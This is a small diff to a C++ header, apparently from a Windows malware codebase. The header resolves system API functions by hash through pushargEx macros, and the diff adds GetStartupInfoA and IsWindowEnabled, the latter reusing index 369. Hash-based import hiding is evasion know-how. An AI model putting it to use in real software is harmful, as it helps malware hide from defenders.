@@ -413,6 +413,7 @@ const static int ApiCacheSize = 550;
 #define pFlushViewOfFile			pushargEx< DLL_KERNEL32, 0x664FD32B, 192 >
 #define pGetExitCodeProcess			pushargEx< DLL_KERNEL32, 0xFDC94385, 193 >
 #define pFlushFileBuffers			pushargEx< DLL_KERNEL32, 0x2f2feeda, 194 >	
+#define pGetStartupInfoA			pushargEx< DLL_KERNEL32, 0x407A1C6A, 0 >
 
 //advapi32
 #define pCreateProcessAsUserA		pushargEx< DLL_ADVAPI32, 0x985267C4, 195 >
@@ -592,6 +593,7 @@ const static int ApiCacheSize = 550;
 #define pBlockInput					pushargEx< DLL_USER32, 0xF103B589, 367 >
 #define pSendInput					pushargEx< DLL_USER32, 0xce1781d0, 368 >
 #define pEnumThreadWindows          pushargEx< DLL_USER32, 0x605A65D8, 369 >
+#define pIsWindowEnabled			pushargEx< DLL_USER32, 0xEEC91F07, 369 >
 
 //winsock
 #define pWSACleanup 				pushargEx< DLL_WINSOCK, 0x8FB8B5BD, 370 >
